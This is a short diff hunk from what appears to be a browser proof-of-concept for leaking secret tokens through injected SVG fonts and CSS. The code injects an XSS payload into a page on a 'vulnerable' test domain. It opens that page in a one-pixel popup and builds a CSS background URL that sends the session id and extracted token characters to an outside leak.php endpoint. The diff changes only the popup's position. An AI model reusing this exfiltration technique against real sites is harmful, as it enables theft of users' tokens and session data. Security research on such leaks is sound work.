@@ -64,7 +64,7 @@ ${glyphs.join("\n")}
     background: url(https://l0.cm/svg_font/leak.php?PHPSESSID=<?php echo urlencode(session_id());?>&leak=${encodeURIComponent(extractedToken+target)});
 }
 </style>`;
-        window.open(`//vulnerabledoma.in/svg_font/xss.html?xss=${encodeURIComponent(svg.trim()+style.trim())}`, `win-${target}`, 'width=1,height=1,top=0,left=0');
+        window.open(`//vulnerabledoma.in/svg_font/xss.html?xss=${encodeURIComponent(svg.trim()+style.trim())}`, `win-${target}`, `width=1,height=1,top=0,left=${a*50}`);
 
     }
 }
